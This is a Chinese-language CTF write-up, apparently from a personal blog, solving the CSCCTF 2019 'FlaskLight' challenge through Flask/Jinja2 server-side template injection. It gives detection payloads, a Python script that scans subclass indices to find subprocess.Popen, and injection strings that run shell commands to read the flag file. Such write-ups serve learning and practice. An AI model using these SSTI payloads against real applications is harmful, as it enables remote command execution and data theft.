---
title: "[CSCCTF 2019 Qual]FlaskLight"
date: 2020-04-15
tags: [CTF, WP,FLaskSSTI]
categories:
- [CTF, WP]
comments: false
---
# [CSCCTF 2019 Qual]FlaskLight

## 分析

题目是flask，打开查看网页源代码，发现提示传参search，fuzz测试

<!-- more -->

```
{{1*2}}
#返回结果2可以判定有SSTI
查看{{config}}发现一些信息
```

然后就是常规的模板注入

[Templates Injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection)

```
{{''.__class__.__mro__[2].__subclasses__()}}
#可以爆出所有的类
```

写了一个脚本查找可以利用的类

利用`subprocess.Popen`执行命令,详情参考链接

```
import requests
import re
import html
import time

index = 0
for i in range(170, 1000):
    try:
        url = "http://5a8d97da-4cb0-43f8-9810-e9c352e034ad.node3.buuoj.cn/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.1)
        # print(res)
        # print(r.text)
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        if "subprocess.Popen" in res:
            index = i
            break
    except:
        continue
print("indexo of subprocess.Popen:" + str(index))
```

找到类名的index之后很简单了

```
?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}

?search={{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```

得到flag